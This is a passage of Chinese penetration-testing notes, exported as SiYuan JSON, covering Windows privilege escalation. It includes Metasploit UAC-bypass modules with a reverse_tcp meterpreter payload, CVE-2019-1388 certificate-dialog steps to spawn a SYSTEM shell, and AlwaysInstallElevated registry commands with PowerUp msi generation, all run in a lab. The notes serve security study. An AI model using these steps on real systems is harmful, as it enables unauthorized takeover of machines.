eCodeBlockCode","Data":"getuid  //查看当前用户权限\ngetsystem   //提权\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029164841-cpke2z6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-cpke2z6","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028194928-hbrxvp3.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-r6kdy68","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-r6kdy68","updated":"20241029164841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"backgroud  //退出会话，这里是会话7\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029164841-stcxcxd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-stcxcxd","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028194953-n3s6hx9.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-arttnpz","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-arttnpz","updated":"20241029164841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"use exploit/windows/local/bypassuac\nshow options\nset session 7\nset payload windows/meterpreter/reverse_tcp\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029164841-lsh69qu","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-lsh69qu","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028195026-1dkvx20.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-8r8j12e","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-8r8j12e","updated":"20241029164841"}},{"ID":"20241029164841-wucd4bo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-wucd4bo","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028195059-4m0rorx.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-ay6wuwe","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-ay6wuwe","updated":"20241029164841"}},{"ID":"20241028141805-118k4w4","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028141805-118k4w4","updated":"20241028141812"},"Children":[{"Type":"NodeText","Data":"美少妇的RunAs模块"}]},{"ID":"20241029165009-ofw9ar7","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029165009-ofw9ar7","updated":"20241029165028"},"Children":[{"ID":"20241029164944-etmixv9","Type":"NodeParagraph","Properties":{"id":"20241029164944-etmixv9","updated":"20241029165015"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"strong text","TextMarkTextContent":"缺点：这个会出现弹窗--表示有人在黑你"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029165015-lj4979g","Type":"NodeParagraph","Properties":{"id":"20241029165015-lj4979g","updated":"20241029165028"},"Children":[{"Type":"NodeText","Data":"使用 exploit/windows/local/ask 模块，创建一个"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"可执行文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"\n目标机器会运行一个"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"发起提升权限请求的程序"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，提示用户是否要继续运行\n如果用户选择"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"继续运行"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"程序，就会返回一个高权限的meterpreter shell"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029165033-6s2871a","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165033-6s2871a","updated":"20241029165037"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241029165033-9br22bu","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165033-9br22bu","updated":"20241029165052"},"Children":[{"Type":"NodeText","Data":"使用exploit/windows/local/ask 模块"}]},{"ID":"20241029165106-9g8vynb","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165106-9g8vynb","updated":"20241029165106"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"use exploit/windows/local/ask\nset session 7\nrun\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029165106-zoib4ob","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165106-zoib4ob","updated":"20241029165106"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028195443-e5i1ad0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165106-1pgpbo8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165106-1pgpbo8","updated":"20241029165106"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028195355-ljd37pf.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165106-vm284zt","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165106-vm284zt","updated":"20241029165106"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028195432-5n3t5kn.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165033-0w1lei1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165033-0w1lei1"}},{"ID":"20241029165034-9tsowyi","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165034-9tsowyi"}},{"ID":"20241028141904-5lp9v8l","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028141904-5lp9v8l","updated":"20241028142207"},"Children":[{"Type":"NodeText","Data":"漏洞CVE-2019-1388实现bypass UAC  --逻辑漏洞"}]},{"ID":"20241029165238-bdrj0qn","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029165238-bdrj0qn","updated":"20241029165509"},"Children":[{"ID":"20241029165235-6fw1q9d","Type":"NodeParagraph","Properties":{"id":"20241029165235-6fw1q9d","style":"color: var(--b3-font-color9);","updated":"20241029165257"},"Children":[{"Type":"NodeTextMark","Properties":{"parent-style":"color: var(--b3-font-color9);"},"TextMarkType":"strong","TextMarkTextContent":"搜狗输入法漏洞也有这个逻辑漏洞哦"},{"Type":"NodeKramdownSpanIAL","Data":"{: parent-style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029165418-cqzfmrf","Type":"NodeParagraph","Properties":{"id":"20241029165418-cqzfmrf","updated":"20241029165436"},"Children":[{"Type":"NodeText","Data":"CVE-2019-1388 是Windows证书对话框特权提升漏洞"}]},{"ID":"20241029165439-kyw1i31","Type":"NodeParagraph","Properties":{"id":"20241029165439-kyw1i31","updated":"20241029165454"},"Children":[{"Type":"NodeText","Data":"补丁号：KB4525235 KB4525233"}]},{"ID":"20241029165509-rtm9crj","Type":"NodeParagraph","Properties":{"id":"20241029165509-rtm9crj","updated":"20241029165509"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"漏洞原理："}]},{"ID":"20241029165526-89cgd8x","Type":"NodeParagraph","Properties":{"id":"20241029165526-89cgd8x","updated":"20241029165606"},"Children":[{"Type":"NodeText","Data":"此漏洞是因为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"UAC机制的设定不严"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"导致的，默认情况下Windows会在一个单独的桌面(Secure Desktop上显示所有的 UAC提示。这些提示是由 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"consent.exe"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":" 的可执行文件生成的，该文件以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":" NT AUTHORITYSYSTEM"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"身份运行，并且有"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"System的完整性水平"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029165509-m8qd7gt","Type":"NodeParagraph","Properties":{"id":"20241029165509-m8qd7gt","updated":"20241029165509"},"Children":[{"Type":"NodeText","Data":"\t如果在运行一个"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"可执行文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的时候我们触发了 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"UAC"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，在"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"点击「展示证书发行者的详细信息」这个链接"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"之后，可以看到证书里的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":" lssued by "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"字段，这个字段对应的值就是 OID。证书会"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"解析 OID "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的值，可能显示为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"超链接"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，但是"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text strong","TextMarkTextContent":"Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029165623-e7xxrtk","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165623-e7xxrtk","updated":"20241029165628"},"Children":[{"Type":"NodeText","Data":"影响系统"}]},{"ID":"20241029165623-kzee1nk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165623-kzee1nk","updated":"20241029165642"},"Children":[{"Type":"NodeText","Data":"Microsoft Windows Server 2019\nMicrosoft Windows Server 2016\nMicrosoft Windows Server 2012\nMicrosoft Windows Server 2008 R2\nMicrosoft Windows Server 2008\nMicrosoft Windows RT 8.1\nMicrosoft Windows 8.1\nMicrosoft Windows 7"}]},{"ID":"20241029165648-t4ucbms","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165648-t4ucbms"}},{"ID":"20241029165648-9fzw1xq","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165648-9fzw1xq","updated":"20241029165652"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241029165719-gglc9xf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-gglc9xf","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"使用kali远程连接"}]},{"ID":"20241029165719-dgubp0u","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-dgubp0u","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"rdesktop 192.168.100.242"}]},{"ID":"20241029165719-yb04wjl","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-yb04wjl","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"本地权限"}]},{"ID":"20241029165719-mxkzkpy","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-mxkzkpy","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028161559-2je5wis.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-2xkvikv","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-2xkvikv","updated":"20241029165719"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"systeminfo\u003esnowming.txt\u0026(for %i in (KB4525235 KB4525233) do @type snowming.txt|@find /i \"%i\"|| @echo no this padding: %i)\u0026del /f /g /a snowming.txt\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029165719-s2m8qjg","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-s2m8qjg","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028160358-4j2pt3i.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-bfv55if","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-bfv55if","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"将HHUDP.exe文件上传到目标主机上"}]},{"ID":"20241029165719-cd0c0lh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-cd0c0lh","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028160504-00lexsb.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028160522-u2nilrp.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 47%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028160551-v4fw6zg.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 47%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-heepk39","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-heepk39","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"点击显示详细信息"}]},{"ID":"20241029165719-i1tidaz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-i1tidaz","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028160732-uexnqqa.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-e6j7gr4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-e6j7gr4","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"后面会弹出页面，然后将点击页面另存为"}]},{"ID":"20241029165719-l4tmo7g","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-l4tmo7g","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028161034-qwa5k0b.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-likstrg","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-likstrg","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028161244-ui5u3is.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165719-ro2qtln","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165719-ro2qtln","updated":"20241029165719"},"Children":[{"Type":"NodeText","Data":"不保存，在此搜索框中去搜索\"C:\\Windows\\System32\\cmd.exe\""}]},{"ID":"20241029165718-g5tb61u","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165718-g5tb61u","updated":"20241029165729"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028161456-ufamrq8.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029165718-arv2gro","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165718-arv2gro"}},{"ID":"20241028142412-bu3ck6q","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20241028142412-bu3ck6q","updated":"20241028142423"},"Children":[{"Type":"NodeText","Data":"Windows错误系统配置提权"}]},{"ID":"20241029165850-qd2tw37","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029165850-qd2tw37","updated":"20241029165853"},"Children":[{"Type":"NodeText","Data":"系统服务权限配置错误有如下两种可能:"}]},{"ID":"20241029165854-50y2q11","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165854-50y2q11","updated":"20241029165906"},"Children":[{"Type":"NodeText","Data":"1."},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"服务未启动"},{"Type":"NodeText","Data":":攻击者可以使用任意服务替换原来的服务，然后重启服务"}]},{"ID":"20241029165903-p6wb5l8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165903-p6wb5l8","updated":"20241029165909"},"Children":[{"Type":"NodeText","Data":"2."},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"服务正在运行且无法被终止"},{"Type":"NodeText","Data":":这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用dl劫持技术并尝试重启服务来提权"}]},{"ID":"20241028142504-w31csuj","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028142504-w31csuj","updated":"20241028142510"},"Children":[{"Type":"NodeText","Data":"注册表AlwaysInstallElevated"}]},{"ID":"20241029165929-5fap07q","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029165929-5fap07q","updated":"20241029165958"},"Children":[{"Type":"NodeText","Data":"注册表键AlwaysInstalElevated是一个策略设置项。windows允许"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"低权限用户"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"System权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITYSYSTEM杈限来安装恶意的msi(Microsoft Windows Installer文件。"}]},{"ID":"20241028142519-h504mh8","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028142519-h504mh8","updated":"20241029170016"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241029170019-avmgox8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170019-avmgox8","updated":"20241029170033"},"Children":[{"Type":"NodeText","Data":"1.运行gpedit.msc打开组策略编辑器"}]},{"ID":"20241029170043-nevf23j","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170043-nevf23j","updated":"20241029170043"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029170043-nfzrctf.png"},{"Type":"NodeCloseParen"}]}]},{"ID":"20241029170048-5bo7xg0","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170048-5bo7xg0","updated":"20241029170119"},"Children":[{"Type":"NodeText","Data":"2.启用：永远以最高特权进行安装"}]},{"ID":"20241029170136-z8gsy8u","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170136-z8gsy8u","updated":"20241029170139"},"Children":[{"Type":"NodeText","Data":"\t注册表"}]},{"ID":"20241029170121-5hbq6bz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170121-5hbq6bz","updated":"20241029170121"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029170121-4hu2pqp.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029170013-loch1q2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170013-loch1q2","updated":"20241029170148"},"Children":[{"Type":"NodeText","Data":"\t命令行"}]},{"ID":"20241029170148-agba5f6","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029170148-agba5f6","updated":"20241029170240"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\installer /v AlwaysinstallElevated /t REG_DWORD /d 1\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\installer /v AlwaysinstallElevated /t REG DWORD /d 1\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029170013-o6ulijx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170013-o6ulijx","updated":"20241029170344"},"Children":[{"Type":"NodeText","Data":"3.启用AlwavslnstalElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将以System权限执行，设置好了后换个普通用户登录，测试是否启用AlwaysInstallElevated(实验前安装Powerup工具)，返True，说明己启用。"}]},{"ID":"20241029170345-vh0cez6","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029170345-vh0cez6","updated":"20241029170404"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"powershell.exe -exec bypass -Command \"\u0026 {lmport-Module .\\PowerUp.ps1;Get-RegistryAlwaysinstallElevated}\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029170422-7fynqh4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170422-7fynqh4","updated":"20241029170514"},"Children":[{"Type":"NodeText","Data":"4.导出msi文件，当前目录生成userAdd.msi（利用了 powerup生成的用户添加程序）"}]},{"ID":"20241029170515-3xh53o4","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029170515-3xh53o4","updated":"20241029170552"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"powershell.exe -exec bypass -Command \"\u0026 {lmport-Module 